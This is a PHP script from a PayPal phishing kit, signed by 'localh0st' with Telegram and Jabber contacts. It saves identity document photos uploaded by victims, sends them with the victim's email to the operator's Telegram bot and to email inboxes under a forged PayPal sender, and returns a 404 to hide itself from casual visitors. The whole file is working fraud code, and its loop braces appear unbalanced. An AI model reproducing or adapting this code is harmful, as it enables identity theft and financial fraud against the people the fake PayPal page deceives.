<?php
/*
COPYRIGHT © aka localh0st
Telegram : localh0st337
Jabber : localh0st@jabb3r.org
*/
    if(isset($_POST['doc_type'])&&isset($_POST['images'])){
	session_start();
	include '../mine.php';
	include '../bot.php';
	function upImg($vl){
		$t=microtime(true);
		$micro=sprintf("%06d",($t - floor($t))* 1000000);
		$today=date("m.d.y.h.i.s.U".$micro,$t);
		$name=hash('md5',$today);
		$type=explode(';',$vl)[0];
		$type='.'.explode('/',$type)[1];
		$base='Folder -> /proof/ Image Name ->';
		file_put_contents('./../../proof/'.$name.$type,base64_decode(explode(',',$vl)[1]));
		return $base.$name.$type;}$_SESSION['doc_type']=$_POST['doc_type'];
		$msg="=========== <[ -".$scamname."- PPL IDENTITY ]> ===========\r\n";
		$msg.="ID OF USER	: {$_SESSION['EML']}\r\n";
		$msg.="TYPE		: {$_POST['doc_type']}\r\n";
		for($i=0;$i<count($_POST['images']);$i++){$msg.="FACE (".(int)($i+1).")	: ".upImg($_POST['images'][$i])."\r\n";

file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($msg)."" );
$subject="-".$scamname."- PAYPAL IDENTITY [".$_POST['doc_type']."] From [".$_SESSION['ip_countryName']."]";$headers="From: localh0st <NewID@paypal.com>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	if ($sendtoemail=="yes") {
	foreach(explode(",",$yours) as $your){
			@mail($your,$subject,$msg,$headers);
	}
	}
}
exit('done');
}if(!isset($_POST['doc_type'])){
     header('HTTP/1.0 404 Not Found');
}
?>